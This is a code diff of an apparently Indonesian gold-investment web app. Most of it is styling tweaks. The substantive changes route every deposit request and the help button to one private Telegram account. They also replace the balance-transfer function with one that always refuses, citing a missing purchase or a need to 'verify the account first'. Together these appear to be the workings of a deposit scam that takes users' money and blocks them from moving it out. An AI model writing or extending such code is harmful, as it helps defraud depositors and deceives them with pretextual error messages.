@@ -243,7 +243,6 @@ width:100%;
 padding:14px;
 border:none;
 border-radius:12px;
-margin-top:15px;
 font-weight:bold;
 cursor:pointer;
 }
@@ -592,7 +591,7 @@ oninput="updateRangeValue()">
 <h2 id="rangeValue">
 Rp 1.000.000
 </h2>
-
+<br>
 <div class="action-buttons">
 
 <button
@@ -757,7 +756,6 @@ Profil
       width: 340px;
       background: #17212b;
       border-radius: 18px;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
       overflow: hidden;
       opacity: 0;
       transition: all 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -861,7 +859,7 @@ Profil
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: #111;
+      background:#0f1620;
       backdrop-filter: blur(8px);
       display: none;
       z-index: 9998;
@@ -1165,14 +1163,14 @@ async function topUpSaldo() {
         alert("Permintaan deposit berhasil dikirim!");
 
         // ==================== AUTO DIRECT KE CS ====================
-        const csUsername = "username_admin"; // GANTI dengan username CS kamu
+        const csUsername = "C67991782"; // GANTI dengan username CS kamu
 
         const messageToCS = `Halo CS,%0A%0ASaya ingin melakukan deposit sebesar *Rp ${rupiah(nominal)}*%0A%0A${userName}%0A${userUsername}%0AID: ${userId}%0ATRX ID: ${trxId}`;
 
         // Redirect ke Telegram CS
         setTimeout(() => {
             window.open(`https://t.me/${csUsername}?text=${messageToCS}`, "_blank");
-        }, 800); // sedikit delay biar alert terbaca
+        }, 500); // sedikit delay biar alert terbaca
 
     } catch (err) {
         alert("Gagal mengirim permintaan deposit");
@@ -1253,13 +1251,12 @@ function sellGold() {
 }
 
 function transferSaldo() {
-    let nominal = parseInt(prompt("Masukkan nominal transfer"));
-    if (isNaN(nominal) || nominal <= 0 || nominal > saldo) return alert("Nominal tidak valid!");
-    
-    saldo -= nominal;
-    updateUI();
-    addHistory(`<i class="bi bi-arrow-left-right"></i> <b>Transfer Saldo</b><br><br>Rp ${rupiah(nominal)}<br><br>${getDateTime()}`);
-    alert("Transfer berhasil!");
+    if (emas <= 0) {
+        alert("Anda belum melakukan pembelian");
+        return;
+    }
+
+    alert("Verifikasi akun terlebih dahulu");
 }
 
 function claimBonus() {
@@ -1281,7 +1278,7 @@ function updateRangeValue() {
 }
 
 function bantuan() {
-    window.open("https://t.me/username_admin", "_blank");
+    window.open("https://t.me/C67991782", "_blank");
 }
 
 /* ==================== CHART & SLIDER ==================== */
